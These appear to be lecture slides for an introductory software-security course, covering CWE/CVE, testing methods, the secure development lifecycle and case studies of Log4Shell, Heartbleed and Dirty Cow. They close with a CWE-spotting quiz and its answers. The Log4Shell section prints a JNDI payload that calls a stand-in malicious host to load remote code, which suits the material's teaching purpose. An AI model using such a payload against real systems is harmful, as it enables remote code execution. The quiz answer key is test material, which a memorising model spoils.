# **Cybersecurity Basics**
## **Software Security**
**Building Resilient Applications in a Cyber-Threatened World**

---

## **What you will learn...**
* What is software safety and security?
* What are common software vulnerabilities?
* How do we classify security issues in code: CWE vs CVE?
* What are security testing techniques?
* What is the secure development lifecycle?
* What are some examples of real-world vulnerabilities?
* What are some examples of vulnerable code?

## **What is software security?**
Software security refers to the processes and practices involved in developing secure software systems that are resistant to malicious attacks and unintended vulnerabilities. It encompasses all the steps taken to ensure confidentiality, integrity, and availability of software systems throughout the software development life cycle.

## **Why is Software Security important?**
![iot_cloud_connections](img\13\01.png)

## **Definitions**
* **Definition: Software Safety**
  Software Safety refers to the condition of being secure against both intended and unintended threats, and ensuring that software does not cause harm to people, property, or the environment.
* **Definition: Software Security**
  Software Security focuses on protecting software from unauthorized access, use, or destruction, and ensuring the confidentiality, integrity, and availability of software and its associated data.

*Software safety is about reducing the likelihood of a piece of software causing harm, while software security is specifically about protection against malicious actors.*

## **What are common vulnerabilities?**
* Buffer Overflows
* Injection Vulnerabilities (SQL, Command, XML, etc.)
* Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)
* Insecure Deserialization and Broken Access Control
* Improper Limitation of Resources (DoS, DDoS)
* Coming up: Supply Chain Vulnerabilities (typosquatting)

## **Example of vulnerable code**
![sql](img\13\02.png)
*SQL Injection because of weak query input sanitization.*

## CVE vs. CWE

- CWE (https://cwe.mitre.org/)
    Common Weakness Enumeration, is a collection of standardized names and descriptions for common software weaknesses that categorize weaknesses based on their type and scope, providing a framework for discussing and addressing software security threats.

- CVE (https://cve.mitre.org/)
    Common Vulnerabilities and Exposures, is a list of known computer security threats and vulnerabilities in software products, providing a reference point to identify and manage potential risks. Both are created and maintained by MITRE.

CWE focuses on the types of weaknesses or vulnerabilities that can exist in software, while CVE identifies specific instances of vulnerabilities within products or systems.

## **CWE Example: CWE-787**

![sql](img\13\03.png)

**CWE Example in C: CWE-787**

![sql](img\13\04.png)


## CVE Example: CVE-2023-24329
![sql](img\13\05.png)

**CVE Example in Python: CVE-2023-24329**
![sql](img\13\06.png)

## How do you minimize these risks?
**Security Testing Techniques**
- Static Application Security Testing (SAST)
- Dynamic Application Security Testing (DAST)
- Interactive Application Security Testing (IAST)
- Penetration Testing
- Fuzzing

## Testing knowledge levels

- **Black-box**: simulates an external attacker with no knowledge of the internal workings of the system, focusing on inputs and outputs.

- **White-box**: involves full access to the application's source code and architecture, enabling deep analysis of internal logic and vulnerabilities.

- **Grey-box**: strikes a balance, using partial knowledge to replicate attacks from a semi-informed user or insider.

## Testing Methods Detailed
### Static Application Security Testing (SAST)
- Definition: A white-box testing approach that analyzes source code, bytecode, or binaries for security vulnerabilities without executing the application.
- How it works: Scans code against predefined security rules to detect vulnerabilities early in development.
- Pros and Cons:
    - Detects issues before deployment
    - Provides detailed insights into code flaws
    - High false-positive rates
    - Limited runtime context

### Dynamic Application Security Testing (DAST)

- Definition: A black-box testing method that scans a running application for vulnerabilities by simulating real-world attacks.

- How it works: Sends requests and analyzes responses to detect security flaws like SQL injection or XSS.

- Pros and Cons:
    - Identifies runtime vulnerabilities
    - No need for source-code access
    - Limited to discovering surface-level flaws
    - Cannot pinpoint exact reason for the vulnerability

### Interactive Application Security Testing (IAST)

- Definition: A white-box hybrid approach combining aspects of SAST and DAST by analyzing applications in real time during execution.

- How it works: Uses sensors within the application to monitor and detect vulnerabilities as the app runs.

- Pros and Cons:
    - Lower false-positive rate compared to SAST
    - Provides both code-level insights and runtime analysis
    - Requires integration into the application (source code access)
    - May impact performance

### Penetration Testing
- Definition: A manual or automated security assessment where testers simulate real cyberattacks to find and exploit vulnerabilities.

- How it works: Ethical hackers use various techniques (e.g., social engineering, network attacks, web exploits) to uncover weaknesses.

- Pros and Cons:
    - Realistic assessment of security posture
    - Identifies business logic flaws missed by automated tools
    - Time-consuming and expensive
    - Requires skilled testers

### Fuzzing

- Definition: A dynamic testing technique that feeds malformed inputs to a program to uncover security vulnerabilities and unexpected behaviors.

- How it works: Continuously generates and inputs data to the application, monitoring for crashes, memory leaks, or unexpected output.

- Pros and Cons:

    - Effective at discovering unknown vulnerabilities

    - Exposes real runtime issues

    - No need for source-code access

    - Coverage can be limited without guidance


## How effective are these methods?

![How effective are these methods?](img\13\07.png)
[1] Dubniczky, Richard A., et al. ”Castle: Benchmarking dataset for static code analyzers and llms towards cwe detection.” International Symposium on Theoretical Aspects of Software Engineering. Cham: Springer Nature
Switzerland, 2025


## Secure Development Lifecycle (SDLC)
![How effective are these methods?](img\13\08.png)
The Secure Development Lifecycle is a structured approach to integrating security practices into each phase of software development.
It ensures that security is considered from the initial design stages to deployment and maintenance, reducing vulnerabilities and improving resilience against cyber threats.

## Secure Development Lifecycle

**Stages 1/2**
1.  **Compliance**: define compliance needs (e.g., GDPR, HIPAA,
ISO 27001).
2.  **Risk assessment**: identify threats, and assess the likelihood
and impact of risks
3.  **Threat modeling**: identify attackers, attack vectors and
assess the risks (e.g., STRIDE, PASTA)
4.  **Implementation**: Follow secure coding guidelines (e.g., OWASP, CERT)

## Secure Development Lifecycle

**Stages 2/2**

5.  **Testing**: conduct various testing based on requirements (e.g., SAST, DAST, IAST, Pentest)
6.  **Hardening**: remove unnecessary tools and services (e.g., shell from a container)
7.  **Patching**: deploy security patches regularly (fixing version 1.1.x)
8.  **Monitoring**: monitor logs and intrusion detection systems

## High-impact Vulnerabilities

### **Log4Shell Vulnerability (CVE-2021-44228)**

- **Overview**: Log4j is a popular Java-based logging library used in many applications. In December 2021, a critical (CVSS 10.0) remote code execution (RCE) vulnerability was discovered.

- **Exploit**: Log4j versions <= 2.14.1 allowed attackers to inject malicious JNDI (Java Naming and Directory Interface) lookups into log messages.

    - Example payload: `${jndi:ldap://malicious-server.com/exploit}`

- **Impact**: Millions of applications were vulnerable due to Log4j's widespread use. Attackers used it to deploy malware, ransomware, and crypto miners. Affected major companies: AWS, Microsoft, Apple, Google, Cloudflare, VMware, etc.

- **Mitigation**:

    - Upgrade Log4j to 2.17.1+

    - Disable JNDI Lookups (`log4j2.formatMsgNoLookups=true`)

    - Apply Web Application Firewalls (WAFs) to block exploit patterns

### Heartbleed Vulnerability (CVE-2014-0160)

- **Overview**: Heartbleed is a high (CVSS 7.5) memory disclosure vulnerability in OpenSSL's TLS heartbeat extension. Discovered in April 2014, affecting OpenSSL 1.0.1–1.0.1f.

- **Exploit**: Attackers exploit improper bounds checking in TLS heartbeat requests. Allows reading up to 64 KB of server memory, leaking sensitive data.

    - Example request: `Client: "Heartbeat request, send me 64 KB" -> Server: "Here's 64 KB of memory (without verification!)"`

- **Impact**: Leaked private keys, passwords, and session tokens from vulnerable servers. Affected major websites: Yahoo, GitHub, Cloudflare, LastPass, and thousands more. Attackers could impersonate users and decrypt sensitive communications.

- **Mitigation**:

    - Upgrade OpenSSL to 1.0.1g or later.

    - Reissue SSL/TLS certificates to prevent stolen credentials from being reused.

    - Change and invalidate passwords that were leaked.


### Dirty Cow Vulnerability (CVE-2016-5195)

- **Overview**: Dirty Cow is a high severity (CVSS 7.8) privilege escalation vulnerability in the Linux kernel. Discovered in October 2016, affecting Linux kernel versions since 2007.

- **Exploit**: Exploits a race condition in the memory management system (Copy-on-Write, COW). Allows attackers to gain root privileges by modifying read-only files.

    1. Map a read-only file into memory.

    2. Trigger a race condition to modify memory contents.

    3. Escalate privileges to root.

- **Impact**: Affected almost all major Linux distributions (Debian, Ubuntu, Red Hat, CentOS, etc.). Allowed local attackers to escalate privileges and bypass permissions. Used in real-world exploits, including Android device rooting.

- **Mitigation**:
    - Upgrade Linux Kernel to patched versions 4.8.3+, 4.7.9+, 4.4.26+, or 3.16.36+.
    - Apply security patches from OS vendors.
    - Monitor system logs for unusual privilege escalations.


## Let's find CWEs!
![qr_code](img\13\09.png)
**Please fill the questions on Microsoft Forms**

## Did you get phished?
![got_phished?](img\13\10.png)

## Question 1/8
![q1](img\13\11.png)
CWE-327 Use of a Broken or Risky Cryptographic Algorithm

## Question 2/8
![q2](img\13\12.png)
No CWE

## Question 3/8
![q3](img\13\13.png)
CWE-253 Incorrect Check of Function Return Value

## Question 4/8
![q4](img\13\14.png)
CWE-369 Divide By Zero

## Question 5/8
![q5](img\13\15.png)
No CWE

## Question 6/8
![q6](img\13\16.png)
No CWE

## Question 7/8
![q7](img\13\17.png)
CWE-798 Use of Hard-coded Credentials

## Question 8/8
![q8](img\13\18.png)
CWE-835 Loop with Unreachable Exit Condition